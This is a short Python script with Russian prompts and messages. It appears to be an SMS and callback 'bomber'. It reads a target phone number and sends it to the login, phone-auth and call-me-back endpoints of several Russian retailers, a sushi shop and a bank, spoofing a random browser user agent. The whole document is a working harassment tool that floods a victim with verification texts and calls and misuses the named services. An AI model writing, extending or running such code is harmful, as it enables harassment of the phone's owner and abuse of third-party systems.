import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = input('Введите номер хатофона(без +)')


try:
    reponse = requests.post('https://new.moy.magnit.ru/local/ajax/login/', headers=headers, data={'phone' : number })
    print('Отправка прошла успешно')
except:
        print("что-то пошло не так")

try:
    reponse = requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php', headers=headers,
                           json={'user_login': number})
    print('Отправка прошла успешно')
except:
        print("что-то пошло не так")

try:
    reponse = requests.post('https://krasnoyarsk.sushi-market.com/sendForm/callMeBack', headers=headers,
                           json={"name":"Роман","phone": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")

try:
    reponse = requests.post('https://my.modulbank.ru/api/v2/auth/phone', headers=headers,
                           json={"CellPhone": number},)
    print('Отправка прошла успешно')
except: 
        print("что-то пошло не так")




